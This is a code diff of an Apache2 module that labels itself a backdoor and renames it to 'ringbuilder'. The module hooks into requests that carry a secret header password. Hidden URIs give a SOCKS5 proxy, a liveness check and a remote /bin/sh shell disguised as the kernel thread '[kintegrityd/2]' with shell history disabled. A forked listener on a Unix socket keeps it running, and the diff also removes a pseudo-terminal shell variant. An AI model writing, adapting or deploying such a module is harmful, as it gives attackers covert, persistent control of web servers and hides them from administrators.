@@ -1,7 +1,8 @@
 //Socks5 code from https://github.com/fgssfgss/socks_proxy
-/* Code inspired from @TheXC3LL */
+// Inspired from @TheXC3LL --> Ringbuilder POC
 
-/* Backdoor module (@RicoVlad) */
+/* Apache2 Backdoor Module */
+/* By Vlad Rico (@RicoVlad) */
 
 #include <sys/types.h>
 #include <stdio.h>
@@ -21,9 +22,6 @@
 #include <sys/stat.h>
 #include <dirent.h>
 #include <sys/un.h>
-// forkpty() --> https://linux.die.net/man/3/forkpty
-#include <pty.h>
-#include <utmp.h>
 
 #include "httpd.h"
 #include "http_config.h"
@@ -40,11 +38,11 @@
 #define ARRAY_SIZE(x) (sizeof(x) / sizeof(x[0]))
 
 
-#define PASSWORD "P0wn3d"
+#define PASSWORD "1w4NN4b3Y0uRd0g"
 #define SOCKSWORD "/w41t1ngR00M"
 #define PINGWORD "/h0p3"
 #define SHELLWORD "/s4L4dD4ys"
-#define IPC "/tmp/mod_backdoor" //Change
+#define IPC "/tmp/mod_ringbuilder" //Change
 
 pid_t pid;
 
@@ -214,7 +212,7 @@ void *worker(int fd) {
 		}
 		socks5_ip_send_response(fd, ip, p);
 		free(ip);
-    }
+    } 
 
 	app_socket_pipe(inet_fd, fd);
 	close(inet_fd);
@@ -235,89 +233,28 @@ void shell(int socket) {
 	pipe(output);
 
 	spid = fork();
-    if (spid < 0) {
-        fprintf(stderr, "[-] Error: could not fork");
-        exit(EXIT_FAILURE);
-    }else{
+	if (spid == 0) {
 		char *argv[] = { "[kintegrityd/2]", 0 };
         char *envp[] = { "HISTFILE=", 0 };
 		close(input[1]);
 		close(output[0]);
-
+		
 		dup2(socket, 0);
 		dup2(socket, 1);
 		dup2(socket, 2);
 		execve("/bin/sh", argv, envp);
-	}
+	} 
 	return;
 }
 
-void shellPTY(int socket) {
-
-    struct termios terminal;
-    int terminalfd, n = 0;
-    pid_t pid;
-    char input[1024];
-    char output[1024];
-
-    // Creamos un nuevo proceso hijo que operará en un pseudoterminal
-    pid = forkpty(&terminalfd, NULL, NULL, NULL);
-
-    if (pid < 0) {
-        fprintf(stderr, "[-] Error: could not forkpty");
-        exit(EXIT_FAILURE);
-    }
-    else if (pid == 0) { // Estamos en el proceso hijo que tiene el PTY
-        //int input[2];
-        //int output[2];
-        int n, sr;
-        char buf[1024];
-        fd_set readset;
-        struct timeval tv;
-        pid_t spid;
-
-        pipe(input);
-        pipe(output);
-
-        char *argv[] = { "[kintegrityd/2]", 0 };
-        char *envp[] = { "HISTFILE=", 0 };
-        close(input[1]);
-        close(output[0]);
-
-        dup2(socket, 0);
-        dup2(socket, 1);
-        dup2(socket, 2);
-        execve("/bin/sh", argv, envp);
-    }
-    else { // Proceso padre
-        // Atributos: sin ECHO
-        tcgetattr(terminalfd, &terminal);
-        terminal.c_lflag &= ~ECHO;
-        tcsetattr(terminalfd, TCSANOW, &terminal);
-
-        // Utilizaremos select para comprobar si hay datos y enviarlos en un sentido u otro
-        fd_set readfd;
-        for(;;) {
-            FD_ZERO(&readfd);
-            FD_SET(terminalfd, &readfd); // Si terminalfd tiene datos
-            FD_SET(1, &readfd); // Si el socket tiene datos
-            select(terminalfd + 1, &readfd, NULL, NULL, NULL);
-            if (FD_ISSET(terminalfd, &readfd)) { // Hay datos desde el proceso hijo
-                n = read(terminalfd, &output, 1024);
-                if (n <= 0) { write(2, "[+] Shell is dead. Closing connection!nn", strlen("[+] Shell is dead. Closing connection!nn")); break; } write(2, output, n); // Los mandamos por el socket memset(&output, 0, 1024); } if (FD_ISSET(1, &readfd)) { // Hay datos en el socket memset(&input, 0, 1024); n = read(1, &input, 1024); if (n > 0) {
-                write(terminalfd, input, n); // Los escribimos en el STDIN del proceso hijo
-            }
-        }
-    }
-}
 
 
-static int backdoor_post_read_request(request_rec *r) {
+static int ringbuilder_post_read_request(request_rec *r) {
 	int fd, sock, n, sr;
 	fd_set readset;
 	struct sockaddr_un server;
 	struct timeval tv;
-
+	
 	apr_socket_t *client_socket;
 	extern module core_module;
 
@@ -326,7 +263,7 @@ static int backdoor_post_read_request(request_rec *r) {
     apr_table_entry_t *e = 0;
 
 	int backdoor = 0;
-
+	
 	fields = apr_table_elts(r->headers_in);
 	e = (apr_table_entry_t *) fields->elts;
 	for(i = 0; i < fields->nelts; i++) {
@@ -336,7 +273,7 @@ static int backdoor_post_read_request(request_rec *r) {
 			}
 		}
 	}
-
+	
 	if (backdoor == 0) {
 		return DECLINED;
 	}
@@ -345,7 +282,7 @@ static int backdoor_post_read_request(request_rec *r) {
 	if (client_socket) {
 		fd = client_socket->socketdes;
 	}
-
+	
 	if (!strcmp(r->uri, SOCKSWORD)) {
 		worker(fd);
 		exit(0);
@@ -353,7 +290,7 @@ static int backdoor_post_read_request(request_rec *r) {
 	if (!strcmp(r->uri, PINGWORD)) {
 		write(fd, "Alive!", strlen("Alive!"));
 		exit(0);
-	}
+	}	
 	if (!strcmp(r->uri, SHELLWORD)) {
 		if (pid) {
 			char buf[1024];
@@ -377,7 +314,7 @@ static int backdoor_post_read_request(request_rec *r) {
 			sd[1] = fd;
 
 			while (1){
-				for(i = 0; i < 2; i++) {
+				for(i = 0; i < 2; i++) { 	
 					tv.tv_sec = 2;
 					tv.tv_usec = 0;
 					FD_ZERO(&readset);
@@ -395,7 +332,7 @@ static int backdoor_post_read_request(request_rec *r) {
 								write(fd, buf, strlen(buf) + 1);
 							}
 							else {
-								if (n > 0) {
+								if (n > 0) {	
 									write(sock, buf, strlen(buf) + 1);
 								}
 								else {
@@ -408,18 +345,18 @@ static int backdoor_post_read_request(request_rec *r) {
 			}
 			exit(0);
 		}
-	}
+	}	
 
 	return DECLINED;
 }
 
-backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
-    pid = fork();
+ringbuilder_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
+	pid = fork();
 
-    if (pid) {
-        return OK;
-    }
-
+	if (pid) {
+		return OK;
+	}
+	
 	int master, i, rc, max_clients = 30, clients[30], new_client, max_sd, sd;
 	struct sockaddr_un serveraddr;
 	char buf[1024];
@@ -456,7 +393,7 @@ backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, ser
 				max_sd = sd;
 			}
 		}
-		select (max_sd +1, &readfds, NULL, NULL, NULL);
+		select (max_sd +1, &readfds, NULL, NULL, NULL);	
 		if (FD_ISSET(master, &readfds)) {
 			new_client = accept(master, NULL, NULL);
 			for (i = 0; i < max_clients; i++) {
@@ -477,23 +414,21 @@ backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, ser
 				}
 				else  {
 					if (strstr(buf, "SHELL")){
-						shellPTY(sd);
+						shell(sd);
 					}
 				}
-			}
+			} 
 		}
 	}
-
-
 }
 
-static int backdoor_log_transaction(request_rec *r) {
+static int ringbuilder_log_transaction(request_rec *r) {
 	const apr_array_header_t *fields;
     int i;
     apr_table_entry_t *e = 0;
 
 	int backdoor = 0;
-
+	
 	fields = apr_table_elts(r->headers_in);
 	e = (apr_table_entry_t *) fields->elts;
 	for(i = 0; i < fields->nelts; i++) {
@@ -503,7 +438,7 @@ static int backdoor_log_transaction(request_rec *r) {
 			}
 		}
 	}
-
+	
 	if (backdoor == 0) {
 		return DECLINED;
 	}
@@ -511,18 +446,18 @@ static int backdoor_log_transaction(request_rec *r) {
 
 }
 
-static void backdoor_register_hooks(apr_pool_t *p){
-	ap_hook_post_read_request((void *) backdoor_post_read_request, NULL, NULL, APR_HOOK_FIRST);
-	ap_hook_post_config((void *) backdoor_post_config, NULL, NULL, APR_HOOK_FIRST);
-	ap_hook_log_transaction(backdoor_log_transaction, NULL, NULL, APR_HOOK_FIRST);
+static void ringbuilder_register_hooks(apr_pool_t *p){
+	ap_hook_post_read_request((void *) ringbuilder_post_read_request, NULL, NULL, APR_HOOK_FIRST);
+	ap_hook_post_config((void *) ringbuilder_post_config, NULL, NULL, APR_HOOK_FIRST);
+	ap_hook_log_transaction(ringbuilder_log_transaction, NULL, NULL, APR_HOOK_FIRST);
 }
 
-module AP_MODULE_DECLARE_DATA backdoor_module = {
+module AP_MODULE_DECLARE_DATA ringbuilder_module = {
     STANDARD20_MODULE_STUFF,
     NULL,			/* create per-dir    config structures */
     NULL,			/* merge  per-dir    config structures */
     NULL,			/* create per-server config structures */
     NULL,			/* merge  per-server config structures */
     NULL,			/* table of config file commands       */
-    backdoor_register_hooks	/* register hooks                      */
+    ringbuilder_register_hooks	/* register hooks                      */
 };
